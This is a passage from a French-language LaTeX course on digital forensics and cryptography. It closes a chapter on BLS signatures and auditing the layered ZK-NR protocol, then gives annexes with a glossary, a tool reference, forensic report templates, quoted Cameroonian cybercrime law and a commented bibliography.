méthodologique pratiquée depuis le Ch.~\ref{chap:rapport}. Cet
exercice \textbf{est} une mise en situation~: à partir de la seule
description architecturale publique (les quatre couches mentionnées
ci-dessus), vous allez appliquer vous-même les quatre premières
étapes de la méthodologie d'audit (Ch.~\ref{chap:form-meth},
Tableau~31.3), en vous limitant strictement à ce qui peut être
raisonné à partir des propriétés \textbf{publiquement connues} de
chaque primitive composante (Merkle~: Ch.~\ref{chap:for-sys},
intégrité de structures de données~; STARK~: transparent, pas de
\textit{trusted setup}, mentionné au Ch.~\ref{chap:quantique}~;
BLS~: ce chapitre, Section~\ref{sec:etude-bls}~; Dilithium~:
FIPS~204, Ch.~\ref{chap:quantique}).
\end{boxalert}

\subsection{Étape~1. Compréhension (à compléter par vous)}

À partir des quatre couches annoncées, formulez~:
\begin{itemize}
    \item l'objectif de sécurité visé par la combinaison de ces
          quatre primitives (indice~: que permet une preuve à
          divulgation nulle que ne permet pas une simple signature~? Que
          permet une primitive post-quantique que ne permet pas une
          primitive classique~?)~;
    \item le rôle probable de chaque couche selon ses propriétés
          connues (Merkle~: structure d'engagement immuable~;
          STARK~: preuve sans divulgation~; BLS~: signature
          agrégeable à seuil~; Dilithium~: authentification résistante
          au quantique).
\end{itemize}

\subsection{Étape~2. Modélisation (à compléter par vous)}

En vous appuyant sur le Tableau~31.1 (Ch.~\ref{chap:form-meth}),
formulez, en langage naturel d'abord, les lemmes de sécurité que
vous attendriez d'une telle architecture, par exemple~:
``une attestation produite par ce protocole ne peut être reniée
par son émetteur'' (non-répudiation), ``le contenu sous-jacent à
une attestation reste confidentiel sauf divulgation volontaire''
(confidentialité).

\subsection{Étape~3. Analyse manuelle guidée}

Cette étape peut être conduite, en toute rigueur, à partir des
\textbf{seules propriétés publiques} des quatre primitives. Voici
une amorce structurée, à vous de la compléter et de
l'approfondir~:

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{4.0cm}}{%
    \tableauHeader{Aspect} &
    \tableauHeader{Ce que les propriétés publiques
    permettent d'affirmer} &
    \tableauHeader{Ce qui resterait à vérifier}
}
Modularité & Une architecture en couches indépendantes limite,
    en principe, la propagation d'une défaillance d'une couche
    aux autres (principe général de défense en profondeur,
    Ch.~\ref{chap:cryptanal}) & Le degré d'indépendance \textbf{réel}
    entre les couches dans l'implémentation spécifique~;
    une dépendance cachée romprait cette garantie \\
Vulnérabilité BLS & Section~\ref{sec:etude-bls} de ce chapitre
    établit, sur la base de la littérature publique, la
    vulnérabilité de BLS à Shor & Si et comment la couche
    Dilithium compense spécifiquement et complètement cette
    vulnérabilité dans l'architecture précise de ce protocole \\
Transparence STARK & Les STARKs, par construction publique
    documentée, ne requièrent pas de \textit{trusted setup}
    (contrairement aux zk-SNARKs, Ch.~\ref{chap:prim-crypt})
    & La taille effective des preuves générées et leur impact
    sur la performance opérationnelle du protocole \\
Gestion des clés & La checklist générale
    (Section~\ref{sec:recommandations-investigateur}) identifie
    la gestion des clés comme un point de vigilance \textbf{générique}
    pour toute architecture multi-couches & Si des règles formelles
    de rotation et de révocation existent spécifiquement pour ce
    protocole, information non vérifiable sans accès aux
    spécifications complètes \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~32.3. Amorce d'analyse manuelle,
fondée uniquement sur les propriétés publiques des primitives composantes}\end{center}

\subsection{Étape~4. Vers l'analyse automatisée}

Sur la base de ce que vous avez établi aux étapes précédentes,
esquissez (sans nécessairement l'exécuter) la structure d'un modèle
Tamarin pour une telle architecture~: combien de règles de
réécriture anticipez-vous au minimum (une par couche~? davantage
pour modéliser leurs interactions~?), et quels lemmes prioriseriez-vous
en premier compte tenu des points de vigilance identifiés à
l'Étape~3~?

\begin{boiteRemarque}{La valeur pédagogique de cet exercice}
Que vous ayez accès, un jour, aux spécifications complètes d'un
protocole tel que ZK-NR ou à tout autre protocole multi-couches
rencontré dans votre pratique professionnelle, la démarche que
vous venez de mettre en \oe uvre dans cette section
\textbf{constitue exactement la méthode à appliquer}~:
raisonner à partir de ce qui est publiquement établi, identifier
explicitement les questions qui resteraient ouvertes sans
information supplémentaire, et ne jamais combler ces lacunes par
des affirmations non vérifiables, la compétence centrale de
toute la Partie~VI de ce cours.
\end{boiteRemarque}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{BLS}~: signatures courtes et agrégeables, fondées
          sur la difficulté du problème CDH sur courbes appariées~;
          \textbf{solides classiquement, mais structurellement
          condamnées par l'algorithme de Shor}, aucune
          dégradation progressive, une rupture complète.

    \item Le déséquilibre temporel de BLS (robuste aujourd'hui,
          vulnérable demain) \textbf{justifie architecturalement}
          son couplage avec une primitive post-quantique
          (Dilithium/FIPS~204), application directe du principe
          de défense en profondeur (Ch.~\ref{chap:cryptanal}).

    \item \textbf{Recommandation opérationnelle clé}~: pour toute
          signature BLS isolée destinée à un archivage de longue
          durée, vérifier systématiquement l'existence d'une
          signature post-quantique complémentaire archivée en
          parallèle, sinon, documenter cette absence comme
          limitation du dossier.

    \item La \textbf{checklist générale en sept points}
          (Section~\ref{sec:recommandations-investigateur}) est
          directement applicable à tout protocole cryptographique
          rencontré en investigation, simple ou complexe.

    \item Face à une architecture multi-couches \textbf{non
          entièrement documentée} (comme un protocole de recherche
          en cours), la méthode rigoureuse consiste à
          \textbf{raisonner à partir des seules propriétés
          publiques} des primitives composantes, et à
          \textbf{identifier explicitement} ce qui resterait à
          vérifier, jamais à combler les lacunes par des
          affirmations non sourcées.

    \item Cette discipline, distinguer constamment l'établi de
          l'hypothétique, est la compétence unificatrice de
          toute la Partie~VI de ce cours, qu'il s'agisse d'un
          théorème mathématique prouvé (Ch.~\ref{chap:CRO}), d'un
          calcul publié (Ch.~\ref{chap:prim-crypt}), d'un résultat
          de vérification formelle (Ch.~\ref{chap:form-meth}), ou
          d'un protocole en cours de développement (ce chapitre).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~32.1. Cryptanalyse appliquée \niveaubase}]
\begin{enumerate}[(a)]
    \item Expliquez, en vous appuyant sur le Tableau~32.1, pourquoi
          la vulnérabilité de BLS à Shor est qualifiée
          d'``effondrement'' plutôt que de simple
          ``dégradation'', en quoi cela diffère-t-il de l'effet
          de Grover sur AES-256 (Ch.~\ref{chap:quantique})~?
    \item Une institution utilise exclusivement BLS pour signer ses
          archives judiciaires destinées à une conservation de
          50~ans. Identifiez le risque principal et la recommandation
          de ce chapitre pour y répondre.
    \item Pourquoi le positionnement CRO de BLS présenté dans ce
          chapitre (Tableau~32.2) est-il qualifié de ``raisonnement
          par analogie'' plutôt que de ``calcul''~? Quelle est la
          différence méthodologique précise~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~32.2. Checklist appliquée à un cas du cours \niveaumoyen}]
Reprenez le mécanisme de ``scellement numérique'' pour les pièces à
conviction électroniques conçu à l'Exercice~31.3
(Ch.~\ref{chap:form-meth})~: hachage SHA-256, signature ECDSA de
l'OPJ, horodatage par autorité tierce.
\begin{enumerate}[(a)]
    \item Appliquez les sept points de la checklist générale
          (Section~\ref{sec:recommandations-investigateur}) à ce
          mécanisme. Pour chaque point, indiquez si votre analyse
          antérieure (Ch.~\ref{chap:form-meth}) l'a déjà couvert,
          ou s'il reste à traiter.
    \item Ce mécanisme combine-t-il une primitive vulnérable au
          quantique (ECDSA) avec une protection post-quantique~?
          Si non, appliquez la recommandation de ce chapitre~:
          que proposeriez-vous pour sécuriser ce mécanisme à long
          terme~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~32.3. Synthèse intégrale de la Partie~VI \niveauexpert}]
Ce dernier exercice de la Partie~VI vous demande de mobiliser
\textbf{l'ensemble} des chapitres~26 à~31.

Une entreprise camerounaise de cybersécurité vous présente un
nouveau protocole, baptisé ``CamSeal'', destiné au scellement de
preuves numériques pour les tribunaux camerounais. La présentation
affirme~: \textit{``CamSeal combine un engagement de Merkle, une
preuve zk-SNARK et une signature à seuil BLS, atteignant un score
CRO de~$\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp} = 0{,}81$,
supérieur à tous les protocoles publiés dans la littérature.''}

\begin{enumerate}[(a)]
    \item \textbf{(Ch.~\ref{chap:CRO}-\ref{chap:prim-crypt})}~:
          évaluez la plausibilité du score annoncé en le comparant
          aux valeurs réellement publiées (Tableau~28.3,
          plage~$0{,}27$--$0{,}57$). Quelles questions précises
          poseriez-vous pour vérifier ce chiffre~?
    \item \textbf{(Ch.~\ref{chap:cryptanal})}~: appliquez la
          taxonomie des failles (Tableau~30.1) pour identifier au
          moins deux catégories de vulnérabilités à examiner en
          priorité pour cette architecture à trois couches.
    \item \textbf{(Ch.~\ref{chap:quantique}, ce chapitre)}~: la
          présentation ne mentionne aucune protection
          post-quantique. Quelle est l'implication, en particulier
          pour la couche BLS, à la lumière de la
          Section~\ref{sec:etude-bls} de ce chapitre~? Que
          recommanderiez-vous~?
    \item \textbf{(Ch.~\ref{chap:form-meth})}~: l'entreprise
          affirme avoir ``prouvé formellement'' la sécurité de
          CamSeal avec Tamarin, sans préciser si certains lemmes
          restent à l'état ``non prouvé''. Quelle question
          poseriez-vous pour clarifier ce point, et pourquoi
          est-elle essentielle avant tout déploiement judiciaire~?
    \item \textbf{(Synthèse, ce chapitre)}~: appliquez la checklist
          complète (Section~\ref{sec:recommandations-investigateur})
          à CamSeal, en indiquant pour chaque point ce que la
          présentation a déjà établi, et ce qui resterait à
          vérifier avant que vous, en tant qu'expert judiciaire
          camerounais (Ch.~12~(UE~SEC4031)), puissiez
          recommander l'adoption de ce protocole pour un usage
          judiciaire.
    \item Rédigez un court avis technique de synthèse (une demi-page),
          destiné à l'autorité qui vous a mandaté, résumant votre
          niveau de confiance actuel dans CamSeal et les conditions
          nécessaires avant tout déploiement opérationnel.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Conclusion de la Partie~VI.} Ce chapitre clôt la Partie~VI
de ce cours, consacrée aux fondements théoriques avancés~: l'impact
du quantique sur la preuve (Ch.~\ref{chap:quantique}), le Trilemme
CRO formalisé et publié (Ch.~\ref{chap:CRO}), son application
méthodique à des primitives réelles (Ch.~\ref{chap:prim-crypt}),
la lecture critique d'un protocole en prépublication
(Ch.~\ref{chap:ZKNR}), les principes de conception et de
cryptanalyse (Ch.~\ref{chap:cryptanal}), l'outillage de la preuve
formelle (Ch.~\ref{chap:form-meth}), et enfin cette mise en pratique
intégrative.

Le fil conducteur de ces sept chapitres a été, au-delà de leur
contenu technique propre, une \textbf{discipline méthodologique
constante}~: distinguer rigoureusement ce qui est établi, publié et
vérifiable, de ce qui demeure une hypothèse de travail ou une
question ouverte. Cette discipline n'est pas spécifique à la
cryptographie théorique, c'est exactement celle exigée de tout
rapport forensique depuis le Ch.~\ref{chap:rapport} de ce cours.

\medskip
\textbf{Conclusion du cours.} Ce chapitre clôt aussi le parcours
entamé au Prologue~: de l'affaire MBONGO, où une simple erreur
procédurale a anéanti un dossier judiciaire, à la question de la
pérennité cryptographique des preuves face à une rupture
technologique encore incertaine. Entre ces deux extrêmes, vous
avez acquis la rigueur méthodologique du PIU, la maîtrise
technique de l'acquisition et de l'analyse multi-supports, la
compréhension du cadre juridique camerounais et international,
et la posture éthique et critique indispensable à la pratique
de l'investigation numérique.

\textit{Cette dernière compétence, l'esprit critique face aux
affirmations non vérifiées, qu'elles proviennent d'un suspect,
d'un outil automatisé, ou d'un discours commercial sur une
technologie émergente, est sans doute la plus durable de
toutes celles enseignées dans ce cours. Les outils changeront.
Les lois évolueront. La rigueur intellectuelle, elle, reste.}
\end{boxinfo}
     
% --------------------------------------------------------------------------
% ANNEXES
% --------------------------------------------------------------------------

\appendix

    %% ============================================================================
%% Fichier  : annexes/Ann_A_glossaire.tex
%% Titre    : Glossaire
%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Définitions abrégées des notions du cours ; le chapitre de référence est
%% indiqué. Alignée sur l'annexe A des autres cours de l'auteur.
%% ============================================================================

\chapter{Glossaire}
\label{ann:glossaire}

Ce glossaire reprend, sous une forme abrégée, les notions du cours. Les
notions de base (acquisition, chaîne de custody, empreinte, bloqueur
d'écriture) sont définies dans l'UE SEC4031. Le renvoi indique le chapitre
où la notion est présentée~; c'est là qu'il faut lire la définition complète.

\begin{description}
    \item[\$MFT, \$UsnJrnl] Table maîtresse des fichiers et journal des
          modifications du système de fichiers NTFS~; sources d'horodatages
          (Ch.~\ref{chap:for-sys}).
    \item[Anti-forensique] Ensemble des techniques qui visent à empêcher,
          compliquer ou tromper l'investigation (Ch.~\ref{chap:anti-for}).
    \item[Artefact d'exécution] Trace qui prouve qu'un programme a été lancé~:
          Prefetch, Amcache, ShimCache, UserAssist (Ch.~\ref{chap:for-sys}).
    \item[Attribution] Rattachement d'une action à une personne ou à un
          groupe~; elle exige plus qu'une adresse IP (Ch.~\ref{chap:for-osint},
          \ref{chap:rapport}).
    \item[Beaconing] Connexions régulières d'un programme malveillant vers son
          serveur de commande (Ch.~\ref{chap:for-res}).
    \item[CloudTrail] Service de journalisation des appels d'interface d'un
          fournisseur de nuage (Ch.~\ref{chap:for-cloud}).
    \item[Conteneur] Processus isolé qui partage le noyau de l'hôte~; il peut
          disparaître avec ses traces (Ch.~\ref{chap:containers}).
    \item[Constatation et analyse] Le fait vérifiable, avec sa source~;
          l'interprétation, avec un niveau de confiance (Ch.~\ref{chap:rapport}).
    \item[Cryptanalyse] Étude des moyens de mettre en défaut un mécanisme
          cryptographique (Ch.~\ref{chap:cryptanal}).
    \item[Deepfake] Contenu audio ou vidéo synthétique qui imite une personne
          réelle (Ch.~\ref{chap:ia-for}).
    \item[Dossier probatoire] Les pièces du rapport, avec leurs empreintes,
          qui permettent à un expert adverse de tout vérifier
          (Ch.~\ref{chap:rapport}).
    \item[Éphéméralité] Disparition rapide des données dans le nuage ou les
          conteneurs, qui impose de conserver d'abord (Ch.~\ref{chap:for-cloud},
          \ref{chap:containers}).
    \item[Exfiltration] Sortie non autorisée de données d'un système
          (Ch.~\ref{chap:for-res}).
    \item[Firmware (micrologiciel)] Logiciel embarqué d'un équipement, à
          extraire et à analyser dans l'investigation des objets connectés
          (Ch.~\ref{chap:for-iot}).
    \item[Fonction de hachage] Fonction qui associe à des données une empreinte
          de taille fixe, résistante aux collisions (Ch.~\ref{chap:prim-crypt}).
    \item[Hypothèse alternative] Explication concurrente que le rapport doit
          examiner et, s'il le peut, réfuter (Ch.~\ref{chap:rapport}).
    \item[IoT] Objets connectés~: routeurs, caméras, enregistreurs, capteurs
          (Ch.~\ref{chap:for-iot}).
    \item[Locard inversé] Toute tentative d'effacer une trace en produit de
          nouvelles (Ch.~\ref{chap:anti-for}).
    \item[Méthode formelle] Analyse mathématique d'un protocole à l'aide d'un
          modèle et d'un outil de vérification (Ch.~\ref{chap:form-meth}).
    \item[Mobile Money] Service de paiement par téléphone mobile, source
          fréquente de preuves et de fraudes (Ch.~\ref{chap:for-mob}).
    \item[Modèle de responsabilité partagée] Répartition des contrôles et des
          journaux entre le fournisseur de nuage et son client
          (Ch.~\ref{chap:for-cloud}).
    \item[Non-répudiation] Propriété qui empêche l'auteur d'une action de
          la nier de façon crédible (Ch.~\ref{chap:ZKNR}).
    \item[NVR] Enregistreur vidéo en réseau des caméras de surveillance
          (Ch.~\ref{chap:for-iot}).
    \item[OSINT] Collecte et analyse d'informations issues de sources
          légalement accessibles au public (Ch.~\ref{chap:for-osint}).
    \item[Post-quantique] Se dit d'un algorithme conçu pour résister à un
          ordinateur quantique (Ch.~\ref{chap:quantique}).
    \item[Prefetch] Fichiers de Windows qui gardent la trace des programmes
          lancés et de leur nombre d'exécutions (Ch.~\ref{chap:for-sys}).
    \item[Preuve à divulgation nulle de connaissance] Preuve qui convainc
          qu'une affirmation est vraie sans rien révéler d'autre
          (Ch.~\ref{chap:prim-crypt}, \ref{chap:ZKNR}).
    \item[Registre Windows] Base de configuration de Windows, riche en traces
          d'activité (Ch.~\ref{chap:for-sys}).
    \item[Rapport forensique] Livrable en trois niveaux~: synthèse,
          rapport technique, dossier probatoire (Ch.~\ref{chap:rapport}).
    \item[Signature BLS] Schéma de signature qui permet l'agrégation de
          signatures (Ch.~\ref{chap:cas-zknr}).
    \item[SQLite] Moteur de base de données embarqué dans la plupart des
          applications mobiles (Ch.~\ref{chap:for-mob}).
    \item[Timeline] Chronologie unique de toutes les sources, horloges
          corrigées (Ch.~\ref{chap:for-sys}).
    \item[Timestomping] Modification des horodatages d'un fichier pour
          tromper la chronologie (Ch.~\ref{chap:anti-for}).
    \item[Triage assisté] Classement d'un volume de données par pertinence
          probable, sans écarter de pièce sans examen (Ch.~\ref{chap:ia-for}).
    \item[Trilemme CRO, cadre CLO] Tension formalisée entre confidentialité,
          fiabilité et opposabilité, et sa mesure (Ch.~\ref{chap:CRO}~;
          \cite{minka2025cro}).
    \item[Volatility] Cadriciel d'analyse de la mémoire vive
          (Ch.~\ref{chap:for-sys}).
    \item[ZK-NR] Architecture cryptographique en couches pour une
          non-répudiation explicable, publiée en prépublication
          (Ch.~\ref{chap:ZKNR}~; \cite{minka2025zknr}).
\end{description}

    % Glossaire étendu (200+ termes). Termes camerounais et africains ajoutés.

    %% ============================================================================
%% Fichier  : annexes/Ann_B_outils.tex
%% Titre    : Référentiel des outils
%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Alignée sur les annexes des autres cours de l'auteur (ACSI, INF3226).
%% ============================================================================

\chapter{Référentiel des Outils}
\label{ann:outils}

Cette annexe rassemble les outils mobilisés dans le cours et dans les labs de
NDAP SUKULU. Les noms de logiciels sont des exemples~: les versions évoluent, et
tout rapport cite l'outil \emph{et sa version}. Un outil se valide avant
usage, sur des données de référence (ISO/IEC~27041).

\section*{Systèmes et mémoire}

\begin{tableaucours}{L{3.6cm}L{6.2cm}L{2.6cm}}{%
    \tableauHeader{Outil} &
    \tableauHeader{Usage} &
    \tableauHeader{Chapitre}
}
Outils d'analyse du registre et de NTFS (\$MFT, \$UsnJrnl) & Preuves d'exécution, chronologie des fichiers & Ch.~\ref{chap:for-sys} \\
Plaso (\texttt{log2timeline}) & Timeline unique de toutes les sources & Ch.~\ref{chap:for-sys} \\
Volatility~3 & Processus, connexions, injections en mémoire & Ch.~\ref{chap:for-sys} \\
\end{tableaucours}

\section*{Réseau, mobile, nuage, objets}

\begin{tableaucours}{L{3.6cm}L{6.2cm}L{2.6cm}}{%
    \tableauHeader{Outil} &
    \tableauHeader{Usage} &
    \tableauHeader{Chapitre}
}
Wireshark, Zeek & Flux, sessions, beaconing, exfiltration & Ch.~\ref{chap:for-res} \\
Lecteurs SQLite, Autopsy & Messages, appels, Mobile Money, EXIF & Ch.~\ref{chap:for-mob} \\
Journaux du fournisseur (par exemple CloudTrail) & Appels d'interface, fenêtres aveugles & Ch.~\ref{chap:for-cloud} \\
\texttt{binwalk} & Extraire et lire un micrologiciel & Ch.~\ref{chap:for-iot} \\
\texttt{kubectl}, journaux d'audit & Conteneurs et grappes Kubernetes & Ch.~\ref{chap:containers} \\
Outils OSINT (WHOIS, archives du web, explorateurs de chaînes) & Domaines, profils, cryptoactifs & Ch.~\ref{chap:for-osint} \\
\end{tableaucours}

\section*{Cryptographie et méthodes formelles}

\begin{tableaucours}{L{3.6cm}L{6.2cm}L{2.6cm}}{%
    \tableauHeader{Outil} &
    \tableauHeader{Usage} &
    \tableauHeader{Chapitre}
}
Bibliothèques post-quantiques (Open Quantum Safe) & Expérimenter ML-KEM et ML-DSA & Ch.~\ref{chap:quantique} \\
Vérificateurs de protocoles (Tamarin, ProVerif) & Analyser formellement un protocole & Ch.~\ref{chap:form-meth} \\
\end{tableaucours}

\begin{boxalert}
\textbf{Rappel.} Aucun outil n'est utilisé sur un système réel sans cadre
légal ni autorisation écrite (loi n°~2010/012, art.~65, 69 et~86~;
Annexe~\ref{ann:lois}).
\end{boxalert}

    % Référentiel complet des outils forensiques (open source + commerciaux).
    % Tableau : outil / OS / usage / commande de base / niveau.

    %% ============================================================================
%% Fichier  : annexes/Ann_C_templates.tex
%% Titre    : Modèles opérationnels
%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Alignée sur les annexes des autres cours de l'auteur (ACSI, INF3226).
%% ============================================================================

\chapter{Modèles Opérationnels}
\label{ann:templates}

Cette annexe rassemble les modèles à reproduire en mission. Chacun renvoie
au chapitre où il est expliqué.

\section*{Fiche de chaîne de custody}

\begin{tableaucours}{L{4.0cm}L{8.4cm}}{%
    \tableauHeader{Rubrique} &
    \tableauHeader{Contenu}
}
Identification & Numéro de pièce, description, numéro de série, état apparent \\
Saisie & Lieu, date et heure, personne, cadre légal (réquisition, perquisition) \\
Acquisition & Outil et version, format, empreintes SHA-256 de l'original et de l'image \\
Scellé & Numéro, date, signataires \\
Mouvements & Date et heure, remis par, remis à, motif, empreinte vérifiée \\
Restitution ou destruction & Décision, date, signataires \\
\end{tableaucours}

\section*{Procès-verbal d'acquisition}

\begin{itemize}
    \item Cadre~: autorité, réquisition, mission, personnes présentes.
    \item Support~: description, photographies, état allumé ou éteint.
    \item Ordre de volatilité respecté (RFC~3227) et justification des choix.
    \item Outils, versions, paramètres~; empreintes calculées et vérifiées.
    \item Incidents et écarts à la procédure, consignés au moment où ils surviennent.
\end{itemize}

\section*{Plan du rapport forensique}

\begin{tableaucours}{L{3.6cm}L{8.8cm}}{%
    \tableauHeader{Section} &
    \tableauHeader{Contenu}
}
Synthèse & Deux à quatre pages, sans jargon~: questions, réponses, niveau de confiance \\
Mission & Contexte et questions posées, telles quelles \\
Méthode & Normes suivies, outils et versions, ordre des opérations \\
Constatations & Faits numérotés, horodatés, avec leur source et leur annexe \\
Analyse & Chronologie, niveau de confiance, hypothèses alternatives, limites \\
Conclusions & Réponses aux questions~; la qualification juridique relève de l'autorité judiciaire \\
Annexes & Pièces, empreintes, formulaires de custody \\
\end{tableaucours}

\section*{Relecture avant dépôt}

\begin{itemize}
    \item Chaque phrase des constatations est-elle vérifiable telle quelle par un autre expert~?
    \item Chaque analyse a-t-elle un niveau de confiance et une hypothèse alternative examinée~?
    \item Chaque pièce citée a-t-elle son empreinte en annexe~?
    \item Le texte évite-t-il toute qualification pénale et toute attribution non établie~?
\end{itemize}
Voir Ch.~\ref{chap:rapport}.

    % Templates opérationnels : formulaire chaîne de custody, rapport forensique,
    % fiche de saisie de scène de crime numérique.

    %% ============================================================================
%% Fichier  : annexes/Ann_D_lois.tex
%% Titre    : Textes juridiques et normatifs
%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Alignée sur les annexes des autres cours de l'auteur (ACSI, INF3226).
%% ============================================================================

\chapter{Textes Juridiques et Normatifs}
\label{ann:lois}

Cette annexe rassemble les textes cités dans le cours. Seuls les extraits lus
dans leur version officielle sont reproduits entre guillemets~; les autres sont
résumés, avec leur référence.

\section*{Loi n° 2010/012 relative à la cybersécurité et à la cybercriminalité}

\begin{boxjuris}
\textbf{Texte officiel}~\cite{cameroun2010a}

\medskip
\textbf{Article~25, alinéas~1 et~2}~: \textit{« (1) Les opérateurs de réseaux et les fournisseurs de services de communications électroniques ont l'obligation de conserver les données de connexion et de trafic pendant une période de dix (10) ans. (2) Les opérateurs de réseaux et les fournisseurs de services de communications électroniques installent des mécanismes de surveillance de trafic des données de leurs réseaux. Ces données peuvent être accessibles lors des investigations judiciaires. »}

\medskip
\textbf{Article~52, alinéa~3}~: \textit{« Les Officiers de Police Judiciaire
et les agents habilités de l'Agence peuvent, lors des investigations,
accéder aux moyens de transport, à tout local à usage professionnel, à
l'exclusion des domiciles privés, en vue de rechercher, de constater les
infractions, de demander la communication de tous les documents
professionnels et en prendre copie, recueillir, sur convocation ou sur
place, les renseignements et justifications. »}

\medskip
\textbf{Article~53, alinéa~1}~: \textit{« Les perquisitions en matière de
cybercriminalité sont susceptibles de porter sur des données qui peuvent
être des supports physiques ou des copies réalisées en présence des
personnes qui assistent à la perquisition. »}

\medskip
\textbf{Article~54}~: \textit{« Les perquisitions et les saisies sont effectuées conformément aux dispositions du Code de Procédure Pénale en tenant compte du dépérissement des preuves. »}

\medskip
\textbf{Article~55}~: \textit{« (1) Lorsqu'il apparaît que les données saisies ou obtenues au cours de l'enquête ou de l'instruction ont fait l'objet d'opérations de transformation empêchant d'accéder en clair ou sont de nature à compromettre les informations qu'elles contiennent, le Procureur de la République, le Juge d'Instruction ou la juridiction de jugement peuvent réquisitionner toute personne physique ou morale qualifiée, en vue d'effectuer les opérations techniques permettant d'obtenir la version en clair desdites données. (2) Lorsqu'un moyen de cryptographie a été utilisé, les autorités judiciaires peuvent exiger la convention secrète de déchiffrement du cryptogramme. »}

\medskip
\textbf{Article~65, alinéa~2}~: \textit{« Est puni des peines prévues à
l'alinéa 1 ci-dessus, tout accès non autorisé, à l'ensemble ou à une
partie d'un réseau de communications électroniques ou d'un système
d'information ou d'un équipement terminal. »}

\medskip
\textbf{Article~69}~: \textit{« Est puni d'un emprisonnement de cinq (05) à
dix (10) ans et d'une amende de 10.000.000 (dix millions) à 100.000.000
(cent millions) F CFA ou de l'une de ces deux peines seulement, celui qui
accède sans droit, et en violation des mesures de sécurité, à l'ensemble ou
à une partie d'un réseau de communications électroniques, d'un système
d'information ou d'un équipement terminal, afin d'obtenir des informations
ou des données, en relation avec un système d'information connecté à un
autre système d'information. »}

\medskip
\textbf{Article~70}~: \textit{« Est puni d'une amende de 1.000.000 (un
million) à 5.000.000 (cinq millions) F CFA, celui qui provoque par
saturation, l'attaque d'une ressource de réseau de communications
électroniques ou d'un système d'information dans le but de l'effondrer en
empêchant la réalisation des services attendus. »}

\medskip
\textbf{Article~86, alinéa~1}~: \textit{« Est puni des peines prévues
l'article 71 ci-dessus, celui qui importe, détient, offre, cède, vend ou
met à disposition, sous quelle que forme que ce soit, un programme
informatique, un mot de passe, un code d'accès ou toutes données
informatiques similaires conçus et ou spécialement adaptés, pour permettre
d'accéder, à tout ou partie d'un réseau de communications électroniques ou
d'un système d'information. »}
\end{boxjuris}

\section*{Autres textes}

\begin{tableaucours}{L{4.4cm}L{4.6cm}L{3.2cm}}{%
    \tableauHeader{Texte} &
    \tableauHeader{Objet} &
    \tableauHeader{Vérification}
}
Loi n°~2010/013~\cite{cameroun2010b} & Communications électroniques & Présentée~; articles à vérifier \\
Loi n°~2024/017~\cite{cameroun2024donnees} & Protection des données personnelles & Présentée~; texte à collationner au Journal officiel \\
Convention de Budapest~\cite{budapest2001} & Cybercriminalité, entraide, conservation rapide & Texte du Conseil de l'Europe \\
Convention de Malabo~\cite{malabo2014} & Cybersécurité et données personnelles (UA) & Texte de l'Union africaine \\
RGPD~\cite{rgpd2016} & Données personnelles (UE) & Journal officiel de l'UE \\
CLOUD Act~\cite{cloudact2018} & Accès aux données détenues par des fournisseurs américains & Texte fédéral des États-Unis \\
\end{tableaucours}

\section*{Normes de la preuve numérique}

\begin{tableaucours}{L{3.6cm}L{8.8cm}}{%
    \tableauHeader{Norme} &
    \tableauHeader{Objet}
}
ISO/IEC~27037~\cite{iso27037} & Identification, collecte, acquisition et préservation \\
ISO/IEC~27041~\cite{iso27041_2015} & Assurer l'aptitude des méthodes d'investigation \\
ISO/IEC~27042~\cite{iso27042_2015} & Analyse et interprétation de la preuve numérique \\
ISO/IEC~27043~\cite{iso27043_2015} & Principes et processus d'investigation \\
NIST SP~800-86~\cite{nist80086} & Intégrer la forensique à la réponse aux incidents \\
RFC~3227~\cite{rfc3227} & Collecte et archivage des preuves, ordre de volatilité \\
Guide de l'ACPO~\cite{acpo2012} & Quatre principes de la preuve numérique \\
\end{tableaucours}

    % Textes législatifs en intégralité :
    % Loi 2010/012, Loi 2010/013, extraits CEMAC pertinents.

    %% ============================================================================
%% Fichier  : annexes/Ann_E_bibliographie.tex
%% Titre    : Bibliographie commentée
%% Version  : 1.0 -- novembre 2026
%% ============================================================================
%% Alignée sur les annexes des autres cours de l'auteur (ACSI, INF3226).
%% ============================================================================

\chapter{Bibliographie Commentée}
\label{ann:biblio}

Pour chaque partie, quelques lectures, avec ce qu'elles apportent. Les références
complètes figurent dans la bibliographie du livre. Les textes de l'auteur sont des
prépublications déposées sur l'IACR ePrint~; aucun travail non publié n'est cité.

\section*{Partie IV · Forensique opérationnelle}
\begin{itemize}
    \item Casey~\cite{casey2004} et Carrier~\cite{carrier2005}~: preuve numérique et systèmes de fichiers.
    \item NIST SP~800-86 et 800-101~\cite{nist80086,nist800101r1}~: intégrer la forensique à la réponse aux incidents~; les mobiles.
    \item ISO/IEC~27037~\cite{iso27037} et RFC~3227~\cite{rfc3227}~: collecte et préservation.
    \item Miller~\cite{miller1956} et Heuer~\cite{heuer1999}~: écrire un rapport lisible, éviter les biais.
\end{itemize}

\section*{Partie V · Défis émergents}
\begin{itemize}
    \item Les cadres de la Partie~IV, appliqués à l'anti-forensique, à l'IA et aux conteneurs~; les textes de l'Annexe~\ref{ann:lois} pour l'entraide.
\end{itemize}

\section*{Partie VI · Fondements cryptographiques}
\begin{itemize}
    \item Shannon~\cite{shannon1948} et Dolev et Yao~\cite{dolevyao1983}~: information et adversaire.
    \item Johnson et al.~\cite{johnson2001ecdsa}, Groth~\cite{groth2016zksnark}~: signatures et preuves à divulgation nulle.
    \item Adida~\cite{adida2009helios,adida2009university}~: un protocole vérifiable mis à l'épreuve.
    \item Le Trilemme CRO~\cite{minka2025cro} et ZK-NR~\cite{minka2025zknr}, prépublications de l'auteur sur l'IACR ePrint.
\end{itemize}

    % Bibliographie complète (style IEEE via biber).

    %% ============================================================================
%% Fichier  : annexes/Ann_F_contacts.tex
%% Titre    : Contacts et ressources
